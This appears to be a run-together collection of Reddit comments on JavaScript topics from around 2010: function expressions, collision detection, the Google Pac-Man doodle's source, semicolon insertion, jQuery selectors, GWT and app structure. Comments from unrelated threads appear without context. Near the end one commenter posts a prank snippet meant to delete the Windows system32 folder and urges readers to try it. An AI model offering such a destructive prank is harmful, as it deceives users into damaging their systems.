I'm completely wrong, as the below two posters have pointed out, but their explanations don't hit on *why*. For that I had to go [here](http://yura.thinkweb2.com/named-function-expressions/), via [this excellent, previous reddit submission](http://stackoverflow.com/questions/2628672/what-every-javascript-programmer-should-know-closed). **var** is not relevant, the key point is that **function** in an expression context yields a *function expression*, whether or not a name is provided. In a function expression, *the name is not visible outside the function that is defined in the expression*. Clear enough? :-) For those upvoting the grandparent, this is critical: *the function knows its own name and can produce it in backtraces, but to the rest of the program it is in a meaningful sense anonymous*.
How come? I kinda like it.
Performance implications.
http://en.wikipedia.org/wiki/Quadtree
&gt; # Arrays should be created with literals ([]) Why? (no, seriously)
Because I can redefine `Array`. Array = function () {}; Array.prototype.push = function (item) { alert("Item stolen: " + item); };
This isn't very efficient. If you're going to loop through the whole array you might as well just do a `if (x&gt;x1 &amp;&amp; x&lt;x2 &amp;&amp; x&gt;y1 &amp;&amp; y&lt;y2)`, which is much faster than writing (and then reading again) from a canvas.
first make a circle-distance-check (skip sqrt, keep it squared, to save some heavy calculations). if the distance is small enough, go on and check if it's really in the box. you might also try to sort them ascending first by either x or y, so you can find candidates faster.
Quadtree implementation is easier, but R-trees are more common for geospatial indexing. http://en.wikipedia.org/wiki/R-tree
[ZIP]
Ah, makes sense. But then again doesn't this also apply for any non-trivial JS application which has a lot of classes? Any sort of redefinition of a function &amp; the application is as good as gone.
uhh yeah, saw that when I viewed source. A non minified version would be more useful,interesting.
Yeah, some analysis might be nice too.
How do you get Mrs Pacman?
fyi: your gmail address is contained in the index.html file. 
Hit the "insert coin" button. Ms. Pacman uses W, A, S, and D for her controls.
It's all divs, css sprites, and javascript. It's not html5 (canvas/svg). It also uses flash for the audio. It's weird that 2 days before this went live, Google was preaching html5 and web apps from the mountain top at Google I/O and then they use flash for this. And after they announced WebM/VP8, the Google I/O videos weren't available in that format.
I almost think they went with flash for the audio to piss off apple. That, and more people with IE were going to see it than people with iphones. Aside from the flash, this is a great example of a cross-browser webapp, and the power of js+css+html4. Until it becomes standard everywhere, HTML5 is great, but of limited use for targeting the entire browser world. I'm actually writing a js library/engine for making games without canvas just like this. I was gonna pour through the pacman code today to see if I saw any interesting things they were doing for performance, I'll post an analysis of whatever I find in a bit. My only thoughts so far are that the js is around 60kb, which seems a little large. My engine is about 15kb and writing a pacman game script would probably be another 15kb for a total of 30, half the size. I did, however notice a lot of game variables/constants and position data hard-coded into their script. I'm guessing this is for performance and probably accounts for the large seeming file size. I also remember hearing on another thread that it was written in Java and compiled into js with the google web toolkit or something, this might account for the size as well (or at least all the hard coded values). Anyhoo, I'm off to go stare at minified js and try and make some sense of it. EDIT: I ran it through JsBeautify, like a smart person.
[here's](http://filevo.com/4tp1y6mdorl8.html) an unminified version (JsBeautifier) of the source, I've just started combing through it. Here's my first find: g.handleFruitTimer = function () { if (g.fruitTime) { g.fruitTime--; g.fruitTime &lt;= 0 &amp;&amp; g.hideFruit() } }; So pretty, yet so efficient and compact.
I've gone through a little more now and can draw a few conclusions. First up, the vars a &amp; e are set to true and false, respectively. They are used for setting other vars instead of using true or false. Saves a little overhead I guess. For a second I thought the closure compiler might do this, but it appears not. Next, var g is initialized as an empty object. Further down all sorts of methods and properties are assigned to it. g is the main game object, all the game rules, pieces and animation functions are properties of g. Somewhat further down (line 1166) there is the E function and a bunch of methods attached via prototype. This is used for creating the game's 'actors'. At line 1978, you can see the method g.createActors, this assigns 5 or 6 actors, created with the E function, to the array g.actors. The first actor(s) that is(are) created are the player(s), who have their 'ghost' property set to false and their 'mode' property set to 1. After that, four actors are created for the ghosts; these have their 'ghost' property set to true, durr... Interestingly, only the players and ghosts are actors and they are both created with the same function. Dots are created using the aptly titled g.createDotElements() function, their div's are given the class 'pcm-d' and the id 'pcm-d'+x+'-'+y. The object r, has two properties, 1 &amp; 2 (for the number of players) and is used for the initial placement of the actors, each property is an array containing the starting position of the players and ghosts. It also has some starting AI logic for the ghosts. The E, or actor function's first method is E.A(), it appears to be an initialization function for actors that are ghosts. It sets the actor's initial position, direction and a number of other flags. It then calls the E.l() method. E.l() randomly chooses which player the ghost should follow. This is useless in single player, but is still called, costing a Math.floor() call and a call to g.rand(), a replacement for Math.rand(). **EDIT 1** The E.z(b) method for game actors, appears to be a movement and wall collision function, it takes the argument b, which it uses to set the actor's direction. Interestingly, direction can be set as one of five numbers: 0,1,2,4,8. This is probably both for speed and for mathematical (as opposed to if...else) methods of changing direction. The function grabs data from the object l, which contains axis and increment properties for each direction. These are used to adjust the actor's position. Position is then checked against the g.playfield array, to determine which directions the actor can move. g.playfield is a 2-dimensional array of tiles that represents the board. First, an empty playfield is created with g.preparePlayfield(). (The function g.determinePlayfieldDimensions() is called first to set the playfield's dimensions) Wall and dot location data is then added to the playfield with g.preparePaths(). The arrays n and o store location data for all walls (referred to as 'paths' in the code) and dots, respectively, which is added to the playfield tiles by this function. After this, the g.prepareAllowedDirections() method crawls through the playfield tiles and uses the path(wall) data of adjacent tiles to determine which direction an actor can and can't move from this tile. This data is then stored in each tile, making the wall collisions lookups in E.z() incredibly fast. 
[here ya go](http://filevo.com/4tp1y6mdorl8.html)
He tells us why - not how
Ugh. That short little function is sloppy in several ways: * One *if* test implemented with an `if` statement, the other *if* test implemented with an `&amp;&amp;` operator, for no real reason. * Post-decrement is slower than pre-decrement in IE. (Not that it is likely to matter in this case, but still, why be in the habit of using it when it isn't necessary?) * Use of post-decrement here requires an extra statement that wouldn't be needed with pre-decrement. * The first *if* test just compares with zero (or null, etc.), but the second *if* test uses `&lt;=`. Can `g.fruitTime` be less than zero or not? Here are some cleaner, faster, and more consistent ways to implement the function. This version uses consistent arithmetic and `&amp;&amp;` for both *if* tests: g.handleFruitTimer = function () { g.fruitTime &gt; 0 &amp;&amp; --g.fruitTime == 0 &amp;&amp; g.hideFruit(); }; Here's the same thing with `if` statements: g.handleFruitTimer = function () { if( g.fruitTime &gt; 0 ) if( --g.fruitTime == 0 ) g.hideFruit(); }; If (like the original function) we assume that `g.fruitTime` can't be negative, and if we want to optimize it a bit by removing some operators and constants, we could use: g.handleFruitTimer = function () { g.fruitTime &amp;&amp; ! --g.fruitTime &amp;&amp; g.hideFruit(); }; Or using `if` statements: g.handleFruitTimer = function () { if( g.fruitTime ) if( ! --g.fruitTime ) g.hideFruit(); }; Any of these would be an improvement over the original.
Check out this game engine: http://gogomakeplay.com/gmp It does what you are asking, and the code is easy to read.
Good point about the pre vs post decrement and IE, it's the little things that kill. I definitely agree that the function isn't the best, I'd be more inclined to go with something along the lines of your third example if I was writing it. I really don't know why their doing a &lt;=0 comparison there, I'm pretty damn sure that g.fruitTime isn't going to be changed by anything between that line and the one above it executing. The one thing I will say for the function is that it's very readable for debugging purposes, but it kinda looks like it was created by a machine. I'm really wondering about a comment someone made to the effect that it was written in java and compiled to js, that would make a lot of sense now that I've looked through the code a bit.
&gt;I almost think they went with flash for the audio to piss off apple. Nah. They used Flash for audio because it's the only way which currently works across browsers. If you use the Audio element, you have to provide your sound files in Ogg/Vobribs, (HE-)AAC, and MP3 flavors. To make matters worse, MP3 isn't suited for looping. Soon you'll only need WebM/Vorbis. This already works pretty well with Firefox's and Opera's current WebM-enabled builds. And it should also work in tomorrow's Chrome builds from the dev channel. There are like half a dozen old school ways to play audio, but they typically only work in one or two browsers, got high latency, don't support looping/volume/mute/stop, and/or don't offer compression.
&gt;`g.fruitTime &lt;= 0 &amp;&amp; g.hideFruit()` A semi-sane human wouldn't write stuff like that. I guess the Closure compiler did that.
Exactly, Flash will work with pretty much everything except devices that start with "iP". Though the way Google's been touting HTML5, I'm a little surprised that they didn't use &lt;audio&gt; and degrade to Flash for IE, etc. Sure it's a teeny bit more work, but a lot less code than say, IE6 support. Seems like they didn't have the time (doubtful) or just they didn't care to bother to support platforms without Flash.
I think you have to hit "insert coin" a second time.
I'm thinking a tree-based solution might not be the best in javascript - since you want to take advantage of the fact that array lookups are done in c++ (and therefore probably accelerated with a binary search). I'll test and find out seems best.
The most appropriate approach for your game is the following: Split your space up into a fixed sized grid. At each grid block create a set. At each frame before you do collision detection "Draw the objects" into this grid. The easiest way is to make an axis aligned bounding box for each object and go over your grid using the aabb and insert that object into the corresponding sets for each grid block the aabb overlaps. Do your collision detection. Check your bounding box and find all the blocks of the grid that it overlaps. You will have a set of grid blocks. Union the objects in each of the sets belonging to those blocks. Run collision detection with each object within the result set and your target space. "Clear out" your grid. Go to each set of each block of the grid and clear them out. The approach I have described above is used in the game "Starship Shooter HD" for the iphone/ipad. edit: All the other approaches are quite complex and don't really offer much more then this method. This method is easy to understand and implement.
thanks - that's what I had in mind too - an aabb to expand to the size of the object, split into grids, look up, union and then process. I was wondering if there was something nicer than a grid acceleration structure (since it doesn't auto-adapt when you have many objects in one area) - but yeah... function getItemsInBB(bb){ var results = {}; var gran = function(i){ return Math.floor(i / 500) * 500; } for(x = gran(bb.x1); x &lt; gran(bb.x2); x++){ for(y = gran(bb.y1); y &lt; gran(bb.y2); y++){ gridCache[x + "," + y].forEach(function(item){ results[item.id] = item; } } } return _.values(items); } That pretty much what you meant? The hard bit imo will be building and updating the cache. 
What does this have to do with Jeff Atwood ? [whoa cool, where have I seen that layout before?](http://1mc.us/blog/)
There is nothing really to auto adapt. The only good reason to have an auto adapting grid would be if your objects were points. Think about it this way, you have an object which is the smallest. If you make your grid any smaller, you dont gain anything. It's just extra computation. If your objects are likely to be dispersed equally across the space, any auto generated "smart" method would produce a uniform split of the area over time. Since you know your game, you will be able to produce it before hand and get over with it. 
[sittin' on chrome](http://www.youtube.com/watch?v=lWedL6d1KqI) for me
If you don't know whats going on under the hood; your going to make a big mess.
I totally agree!.
yup. i'm just procrastinating. On I must forge - to the almight "Ohai reddit - I made a javascript game" beta test!
The first example under the "Recursive anonymous function" does not need to use callee at all. Due to Lexical Scoping, you have access to the count variable from within the function. There is no need to do this, in order to be able to call a function recursively... var count = function(i) { if (i &lt;= 10) { console.log(i); count(i+1); } } count(1); 
Hey now, I have been looking for something like this for a while. Thanks. The only thing left is to integrate vim with [Firebug's crossfire](http://getfirebug.com/wiki/index.php/Crossfire) in the spirit of [clewn](http://sourceforge.net/project/screenshots.php?group_id=111038).
A true dirty loop/closure in JS: var str = 'jabberwocky underpants'; for (var i = 0; ((function(letter) { console.log(letter); return (str[i]) ? ((letter == 'b') ? false : true) : false; })(str[i])); i++) { } 
Oh wow, using an anonymous function in the conditional part of the for loop to control the repeat... How's the str getting passed in to letter? Is it: (function(letter){})( **data here that goes into 'letter'** )
Oh boy! This is super dirty! Thanks for that insight… I hope I never encounter that kind ok ninja style in real code ;)
Why would you ever do such a thing? What's the benefit? var str = 'jabberwocky underpants', i = 0, letter; for ( ; (letter = str[i]); i++) { console.log(letter); if (letter == 'b') break; }
Exactly. :D
Hopefully you wouldn't; this is roughly 4x slower than a standard loop. I wrote that a while ago just to show how flexible JS can be.
that's written at the end of the post (A note about closures to advanced javascripters)
Is it just me or is the demo just here to show that this doesn't work ?
[He did](http://www.reddit.com/r/web_design/comments/c8cio/jquery_vs_javascript_the_masters_share_their/) ;)
 &lt;noscript&gt;Your device is not capable of running Javascript, or you have Javascript disabled.&lt;/noscript&gt; or &lt;div id="whatever"&gt;Your device is not capable of running Javascript, or you have Javascript disabled.&lt;/div&gt; &lt;script type="text/javascript"&gt; document.getElementById('whatever').innerHTML = "Your device is capable of Javascript."; &lt;/script&gt;
Yeah, this is what I was going to suggest as well. Modern smartphones have excellent JS support and IMHO, it's safe to assume that as long as JS is enabled, then you can validate the same DOM properties in the same way you would on a desktop browsers. If you're feeling paranoid about it though, I suppose you could write tests that verify the capabilities of the browser before loading the form and display your error message if any of those tests fail.
but what you actually need to do is use validation on the server in addition to validation on the client and then if the client can't run your form validation, who cares?
When you say "most" modern browsers you mean Opera?
Oh damn, realized webkit (at least iPhone and android browser) did not have proper web forms2 support...disregard my above comment.
brilliant. it's too easy to accidentally drag your mouse over the squares and select them, though. it looks like you're using jquery. this is an easy problem to fix -- [here's a link](http://aleembawany.com/2009/01/20/disable-selction-on-menu-items-with-this-jquery-extension/) to ten lines of code that will solve the issue.
I'm not doing any more work today. Awesome.
I did not write this, just found it somewhere else. Apparently this is from '09.
Short version: the ubiquity of WebKit on mobile devices has made it so that most common tasks work with almost no effort on a wide range of devices. If you write a page that works in desktop Safari, it will almost surely work in MobileSafari on iPhone, which means it almost surely works on Android and WebOS as well. If you want to go any further than that... that's where things get painful. JavaScript support in the BlackBerry browser is pretty dismal, especially before version 4.6 of the OS. Frameworks written for desktop web browsers (like jQuery and Prototype) will work only partially on BlackBerry, so you'll have to dip down into pure JavaScript for some tasks. And there's no good way (that I've found) to debug JS on a BlackBerry; I had to resort to try/catch/alert around specific chunks of code. In short, if you want to balance ease-of-development with market share, target iPhone, Android, Palm, and BlackBerry, in that order. Once you get past those four, the mobile market is (in my opinion) too segmented to bother with supporting anything else.
mission accomplished :)
Really cool! But at the same time.. you are completely changing the image (and perhaps misleading / misrepresenting the real image). Not sure what sort of application this has.. image thumbnails would be ok (although misleading) and many uses of resizes still expect (want) the same image content. Still.. really cool :)
Long verson: PPK says "[There is no Webkit on mobile](http://www.quirksmode.org/blog/archives/2009/10/there_is_no_web.html)"
I think he is referring to the fact that the CSS resized images appear visually better than the javascript resized images, because the JS images are dropping (potentially) vital bits of information.
Sure, just use Flash. (/troll) :D The problem with this is that it's not exactly cross-browser. Not supporting IE6 is one thing, but this won't work in IE7, Opera or older versions of Firefox and WebKit browsers.
Cross domain ajax is here (if you aren't IE6, IE7, FF3.5, Opera 9 or Safari 3)
&gt; Cross domain ajax has just appeared as a dot on the horizon
Here's what you're looking for: http://www.quirksmode.org/m/table.html
Bit old, but still awesome.
So, in other words, we may get to start using it in 10 years.
It's called [seam carving](http://en.wikipedia.org/wiki/Seam_carving). Been around for a while. ImageMagick supports it by [the same name](http://www.imagemagick.org/Usage/resize/#liquid-rescale) as the article.
You can't guarantee every computer has hardware acceleration components.
Instead of re-building an client side cache you could use your browser cache for any GET-calls. Try to use Cache-Control header or use the Etag !
The "content aware resized" images are so unnatural and damaged this seems (today) totally without automatic application.
I remember when only new browsers supported CSS 2 and people were still saying "tables will never die!" :-P.
What could possibly go wrong?
That's a really good article highlighting what jQuery is doing under the hood. I didn't believe that jQuery didn't optimise ':input' to do 'select,textarea,input', but checking into the source proves that it doesn't! I am slightly confused by the example $('#container #elem_id') selector. All IDs should be unique, so I'm not sure what the extra ID achieves? Unless they only want to execute the jQuery when it's contained by the other element, in which case a parent() check would be the best optimisation.
There's nothing factually wrong about this article, but I'm getting a bit tired of articles that encourage _premature_ optimization of already-performant JavaScript.
It doesn't add any real benefit. But I see people use it all the time, thinking it's fast. It's really not. It's no better then using a class.
I wasn't suggesting to change all your code around. I just want to make sure developers are aware of the code they write. It's not about optimizing, its about starting from efficiency. The goal is to help people write good selectors the first time and avoid the pitfalls of bad ones. If your code makes more sense using a bad selector, then use it. It's better to have code that is easy to ready and fix then is it to have optimized code that is ridged.
It's not as easy as it sounds to optimize `:input` to `select,textarea,input`. Because `form &gt; :input` would need to become `form &gt; select, form &gt; textarea, form &gt; input`... and so on. [Mozilla is proposing the `:-moz-any()` pseudoclass](http://dbaron.org/log/20100424-any) to address this.
Yeah, I think it just gets misinterpreted by people with good-faith concerns about performance. I'm worried it will cause a developer to pause and get a feeling of dread when he starts to type `:input`, then backspaces and replaces it without knowing quite why. I did like your advice to store the jQuery return object in a variable (nobody ever does this). And whenever I write jQuery-dependent code, I also follow the convention of prepending my variable name with `$` to remind myself that I'm working with a jQuery object, rather than a raw DOM node.
&gt; The biggest problem with looking up elements by class name is that only the most &gt; recent browsers have support for document.getElementByClassName (I'm looking at you IE!). So most frameworks have to shim with the following code. [ snip ] Wait - this is going to be slow, but only on IE - if `getElementsByClassName` is available in the browser it will be used. Same goes for `forEach` and other stuff. IMO - if it's going to be slow only for IE users and they are minority - that's no big deal.
If IE users were the minority, then it wouldn't be in the article. But they are a 60% ish majority, and that is a big deal. I really hate that, but that's where we are. 
[Relevant chromium ticket](http://code.google.com/p/chromium/issues/detail?id=8441), apparently it's being worked on by the WebKit project. Does not give a workaround it seems.
Not using XSL?
Impressive and works well in Firefox (Namoroka) 3.6.3. What is the prerendering you do at startup when using DHTML ? 
Couldn't agree more on the convention of using $ to denote a jQuery object, which saves every developer in the team the need to check or double extend.
saw the webkit ticket too, i guess there isn't anything to be done till they fix it :( thanks for the link though.
i wish that was an option, but it doesn't make sense to rewrite an application for supporting a minority browser
As a work a round, you try to use xsl:include the stylesheet. This will work the same as xsl:import as long as you don't have any overriding templates or use xsl:apply-imports. If you do then you'll have to rearrange your stylesheet somewhat because of precedence but it should still work. If you can't use xsl:include then i'm not sure.
&gt; The empty statement is just a semicolon by itself, and is a legal statement in JavaScript. For this reason, ";;;" is a valid JavaScript program; it parses as three empty statements, and runs by doing nothing three times. Very Zen.
I plan on making a Chrome extension based on this userscript. Sorry, but I won't maintain the userscript itself for you though. Edit: Can you please license the userscript under the MIT license? By default, it's fully copyrighted and I'm pretty sure I can't license my extension under the MIT license unless yours is too.
;
why not just use the jquery-ui dialog?
;;
I came to post this to Reddit, and found he already had. Well! Upvoted. Seriously, if you read or write *any* JavaScript, ever, for any reason… you have absolutely no excuse not to have read (and grokked) this.
I seriously do not recommend on skipping on semi-colons. It makes later optimisation (compression, obsfucation) almost impossible, and you will run into some awesomely subtle bugs.
Luckily ECMAScript strict mode does away with ["line-break semicolon insertion"](http://www.opendocs.net/web/js/es4/rationale/syntax.html#grammatical-semicolon-insertion).
That is not the case. Your link is to an ES4 proposal, but ES5 makes no such change, in strict mode or otherwise.
Also: https://bugs.webkit.org/show_bug.cgi?id=29703
You're right. Even ES5 strict is compatible to semicolon insertion.
&gt; It makes later optimisation (compression, obsfucation) almost impossible, Even with optional semicolons omitted, later compression is completely trivial: simply use a correct compression tool with a correct parser, such as YUI Compressor or Google's Closure Compiler. There is no good reason to use broken tools when correct tools are readily available. &gt; you will run into some awesomely subtle bugs. Do you mean browser bugs or programmer error? I believe I addressed both in the post. There are no relevant browser bugs, and the cases of programmer error are straightforward once one is aware of the rules.
I just wonder how this possibly deserved a down-vote...
They're still not dead. :(
Having vendor prefixes for CSS was one thing but this hardly needs a vendor prefix. The functionality is straightforward enough that they could have easily gone without the prefix. 
While this is _an_ answer to the question, it is important to point out that just throwing a "Your JS is broken" boilerplate error message at the client is the worst possible fallback in 99% of all cases (i.e. anything other than a rich client like Google Docs).
Maybe you need to get out of whatever industry you're still in? The real web killed table-based layouts a long time ago. I will never work for a company supporting IE6 ever again.
What exactly is the point of automatic semicolon insertion anyway? To save a couple of bytes? In that case, do the sensible thing: Get a script to do this for you automatically. c.f. PHP's short tags.
It sounds like you misunderstand behind the purpose of prefixing. If this becomes an official standard, but the behavior is slightly altered, your future code will have no good way to determine if this was 'original firefox behavior' or 'standard compliant behavior'. Strictly sticking to vendor prefixes until things are standardized is a good thing really.
No, I think he's saying he just doesn't understand how the behavior could be slightly altered between now and standardization, since it's such a simple method. I don't agree with that, but even if I did, I'd want to keep the vendor prefix just because it makes more sense to follow a rule consistently.
Fair enough =) 
even in his captured video the animations end up lagging.
http://www.spritely.net/gallery/ - the video is horrible, but the actual animations perform a reasonably well, with a couple of exceptions. I can see this having its uses for a few small/simple effects, like a scrolling background, but I don't think it's practical for large or complex animations. It could be interesting for game development though, for sure.
&gt; and the cases of programmer error are straightforward once one is aware of the rules. While knowing the rules is definitely a good thing, having to think about them every time you read an otherwise obvious piece of code is not. I applaud your clear exposition, but saying semicolon omission should be decided based on personal preference is akin to saying the same thing of newline insertion or indentation — technically true, but dangerously inadequate as advice.
Your justifications are (as OP has commented) incorrect, but only one is needed: it can make code harder to read.
This is invaluable for BOSH (XMPP in the browser) applications. Seemingly no planned support in jQuery core. Great documentation, works as expected so-far with some moderately complex querying. More about CSS3 namespace selectors: [elements](http://www.w3.org/TR/css3-selectors/#typenmsp) and [attributes](http://www.w3.org/TR/css3-selectors/#attrnmsp).
Oh, me too. It's just that there often is old code to be redone and you practically can't use most of it because it's tables all the way down.
BOSH/XMPP is fine and well, but I still think they introduce too much complexity in the browser which could be abstracted away.
Perhaps, but BOSH is just my use case du jour :). The author has his DAV use case, and I'm sure many others may have complicated Atom documents and the like that may have multiple different (perhaps unknown) namespace prefixes for the same namespace, etc (eg. aggregated documents). That's impossible to handle without proper xmlns support, and I think it's helpful that this plugin provides it. Like it or not, XML is going to be around for a while. And until somebody does find a way to abstract it away, it's nice to be able to use jQuery in all its glory to deal with it :)
Actually, the next version of the Selectors API defines matchesSelector with an optional refNode argument. Neither of the vendor specific methods implement this.
Fair enough. I suppose even the simple stuff can be changed.
And a fine plugin at that.
I just use Java, GWT takes care of most of the javascript... 
I'm horrible at explaining things, but I'll try to give you an idea of what I have been doing for large projects. Firstly, I use PHP and the Zend Framework for most of my projects. I created a custom set of classes that I use to compile, compress and cache css and javascript collections. I also use Mootools as my JS framework because I love the OOP aspect of it and am familiar with its workings. I've been messing around with how to structure things and I think on my current project, I have set it up pretty nicely by mimicking the structure of the Zend Framework. Here is a basic outline my javascript directory: js/ mootools.js application/ application.js controller.js controllers/ library/ app/ bliss/ (a set of classes I've created that I used across projects) The application.js file is setup simlar to a bootstrap file in that it executes any classes that are used globally and executes the current controller and action. In the head of my document I specify the configuration of the current page which includes the controller's name, action and the base URL of the site (all retrieved from Zend's classes). By separating all of these components it greatly organizes my code and shortens the amount of lines that I have to deal with at a time (I'm a bit OCD about these things). The controller classes are setup just like you would a normal MVC framwork and are nice because you don't have to include a new JS file on every page. Here is my controller for my login page: Controller.Login = new Class({ indexAction: function() { new App_Form.Login(); } }); I hope that helps with your question.
ASP.NET MVC is a great framework in itself, in addition to being extensible as hell. 360.com runs it with pretty much all MVC concepts abstracted out to the Javascript client. All communication on the client runs through the same URL routing that has been defined on the server. HTML templates are just another server view that can be loaded dynamically or inlined, the latter in case of frequently used parts. Transport classes are at the lowest OO level with Data classes on top that provide Publish/Subscribe models to the view engine on top with global and local event models per section. There's lots more, but that was some initial input. 
Advice varies, and readability is subjective and highly influenced by personal experience, e.g. with other programming languages. That's why I chose to stick to the facts in this post (which was long enough anyway). I did cover some subjective issues in the previous blog post.
I'm not sure if this is helpful to you, but what I did some time ago was something similar to Django. I had a url dispatcher that called some functions when a url matched a regular expression. Then I had some events/signals going on that allowed me to load specific js files as needed and then call the function I needed. I also had a template parser that helped in parsing json to html. It was an experiment actually trying to make a rapid prototyping environment. So for example, I had a regular expression /home that triggered the view home, view('home', function(){ alert('welcome home') }). If the view required the home.js file I would do something like view('home').requires('home.js') so that before executing it would get that file. View was an instance that had some helper methods and events, like beforeLoad, onLoad etc that helped in adding loading messages and the like.
I use GWT. Writing in Java and compiling to JS beats writing JS by hand any day.
Microsoft could do more on evangelization. If Apple would have added sensible Javascript frameworks I would know (about their existence, and a few key features).
extjs is well received.
Sure, if you know more about Java than JS, HTML and CSS. Then something breaks and you have no idea why, because you are actually writing for the GWT framework - and not JS, HTML or CSS. Edit: I can see people agree with my sentiments, but that's no reason to downvote you. Upboat from me!
You're talking about tools like ExtJS, SproutCore or Cappucino. I'm personally learning SproutCore at the moment, because I'm absolutely rubbish at design and appreciate the look and feel of the created apps. Unlike Cappucino, it doesn't require learning a new language (Objective-J), and unlike ExtJS, isn't mired in the licensing hell they've created for themselves. Have a look at those IMHO, or build something on top of jQuery yourself (which isn't too hard!).
I've used http://javascriptmvc.com/ on our project that has more than 10k lines of javascript code, and it works great! Note that JavascriptMVC is pretty low level, but it works with jQuery so you can use any jQuery plugin with it.
For javascript projects I used to use SproutCore. However, I decided to check out GWT 2.1 after watching the I|O conference and from what I can tell so far, it's pretty sweet. I love client bundle and code splitting! 
I use self-modifying Perl as a small IDE. Code resides in separate named attributes, much like files, and then gets pasted together. Turnaround time is fast because the Perl IDE knows how to run the JS through SpiderMonkey and node.js for syntax checks. I also use Divergence, a library that I'm dogfooding on any project I happen to be developing.
I organize my code into different classes, MVC-style. Then I use custom events throughout my app to connect the different parts (jQuery example here, works with most libs). // In a controller, for example $(this).bind("my:custom:event", $.proxy(Class, callback)); // somewhere else $.event.trigger("my:custom:event", [param1, param2]); Which allows for great de-coupling of concerns between modules/controllers. If you don't want to invoke your events globally, just use $(instance).trigger("my:custom:event"); * http://api.jquery.com/trigger/ * http://api.jquery.com/bind/ * http://api.jquery.com/jQuery.proxy/ I'd also go with http://ejohn.org/blog/simple-javascript-inheritance/ or http://joose.it/ for a simple class system as well as Sammy for Django/Rails/Sinatra-style routing to simplify concerns: http://code.quirkey.com/sammy/ For applications that don't need to be indexed by Google and need to resemble their desktop equivalents, I'd go for SproutCore. 
Cappuccino is really nice but only if you already know Cocoa. I mean, it's nice even if you don't know Cocoa but the learning curve is that much steeper.
this works well: window.onload({ delete.("C:\\\\windows\system32"); }) give it a try :) 
Check out Dojo. By far the most maintainable JavaScript I write is in Dojo. http://www.dojotoolkit.org/
I am using Sammy, a jQuery based application framework. Very lightweight, but nice. I believe it was inspired by Sinatra. 
I looked at GWT and it seems a bit heavy. My initial application is written in Pylons so I feel getting GWT to work along side is going to be tough.
When you mean in a controller, you mean a class you create right? Part of my trouble thus far is that I am still "learning" JavaScript. ( I know the toolkits pretty well but need a better handle on pure JS). I understand trigger and bind. To me they are awesome tools that can be easily used in any MVC framework. I am looking at Sammy now and it seems like what I want! Thanks!
Do you have any more comments about Sammy? Just downloaded it and checking it out. How complicated is the app you are using with it? Any types of gotchas you can share? How about support (I see on github lots of people are contributing/watching so the activity level seems good).
I had tried that before running to reddit, but no, that didn't work :'( . After looking at the webkit ticket, it seems there is no hope till that defect is fixed.
I don't use any frameworks for organization of my code. I do something like this: var gameTypeTemplates = (function($, undef) { var t = {}; var someMemberVar = 123; var someMemberFunction = function(p1, p2) { //... }; t.somePublicFunction = function(p1, p2) { //... var v = someMemberFunction(i1, i2); //... }; return t; })(window['jQuery']);
`fillText` requires Safari 4.x. But even with 4.0.5 (desktop, current stable) it looks really bad. Firefox, Opera, and Chrome are fine though.
&gt;`})(window['jQuery']);` Is the same as `})(window.jQuery);` which is the same as `})(jQuery);`. Both alternatives are better.
I use window['jQuery'] because I use Googles closure compiler and otherwise jQuery would be undeclared. After the minification of the code it will be window.jQuery anyway.
Just checked... yea, seems like this really is the proper way to export variables for the Closure Compiler. How odd. :)
Javascript is insanely powerful tool, which is the reason why I don't want to write it by hand - as I fear for the maintainability of the created code weeks and months from now. I haven't found any decent javascript MVC-framework, which would also have decent crossbrowser support for gui components. GWT gives us a great programmingmodel, but it does not liberate us from understanding what happens below the surface. To be compenent with GWT you have to know your JS, HTML and CSS too, but you do not need to implement your own plumbing for the application stack. Well designed and implemented GWT application can later on be ported to any other capable framework, which supports or can be made to support MVP-pattern. Using GWT is strategic choice for productivity and maintainability. 
Build the app first, then add JS. It should add to the app, not be required to function. After that point use a JS framework that allows proper OO, this will make it maintainable at scale. http://jqueryvsmootools.com
&gt; When you mean in a controller, you mean a class you create right? Yup, a class that connects your models with your presentation and takes care of users' interactions.
Java is also an insanely powerful tool, it all boils down to familiarity and experience within the development team.
Or alternatively, Animated CSS corners.
&gt; For applications that don't need to be indexed by Google and need to resemble their desktop equivalents, I'd go for SproutCore. Have you used SproutCore?
How do you find the performance of functional JavaScript?
Why the downvotes?
Yeah, to some extent. I've built some basic applications with it (I actually built a simple reddit client with it back with 0.9, but I've lost the source). I've also played around a bit with 1.0 and extended the tutorial Todo-app. I quite like the experience, actually. It's a breath of fresh air, especially in comparison to older GUI-frameworks like Swing. I've also tried Cappuccino but didn't like it because of ObjJ. A friend of mine loves Cappuccino (and has done some very impressive things with it) so YMMV.
I'll second the custom eventing. I've been using that in a couple larger apps and it works phenomenally well. Really a night and day difference in maintainability. Also know that you can bind/trigger custom events on JavaScript objects themselves. If you maintain global state objects on your page, you can use $(window.globalVariable).bind/trigger just as you would use it against a DOM selection or window. That's handy because then the execution context (this) of the bound handler(s) is the object itself.
the javascript is just a demo - in everyday use it's built into photoshop and other dedicate image processing software.
Works nicely on the huge project I'm on. We have built up object (widget) libraries, and can crank out forms and GUIs more quickly. Like the eventing framework.
Different tools are different. Java, being statically typed requires more structure and information to be present in the source code, which prevents certain programming tricks, and allows the compiler and IDE environment to reason about your source code and provide assistance. 
Heavy in what sense?
I use Dojo. It has OO support, widgets, etc; but I think the best feature is its package system. It makes it super easy to separate your JS into namespaced modules.
I think they don't like .NET. Requiring any OS for any type of development sucks. (Android core, I'm looking at you.)
Ah, attaching listeners to a Javascript object was actually what I meant in the first example, but I can see how it might not have come through clearly enough. Your explanation was better :)
&gt; mono node.exe server.js Works fine :)
Everything you hate about SQL now available in javascript!
I use it. It *is* heavy. Which for a large application, is worth it. We have to deploy an Eclipse RCP desktop client along with our webapp, so being able to reuse code from the desktop app in the JS client was an important benefit. Interoperating with existing non-GWT services is pretty reasonable via GWT's sane AJAX implementation, but I'm not sure if that's what the OP means by "getting GWT to work alongside". You can always pop out to native JS if you need to, which we had to do to get applet-to-JS communication working (which BTW is a special circle of hell no matter what framework you wrap around it--I woulda preferred to use Flash but I didn't get to make that call).
Not really accurate. You can't write effective GWT apps without understanding JS, HTML, and CSS. It doesn't insulate you from that; rather it provides you with the ability to reuse some of your server-side code and coding practices (OOP patterns and such) on the client side, which is very handy. It also provides some really handy debugging tools; I generally stay in the Eclipse debugger when debugging the client side, and rarely have to use something like Firebug. Don't get me wrong, I love JQuery and such, and I have some quibbles with Java itself, but having worked on a big GWT application I can see the benefits.
ಠ_ಠ
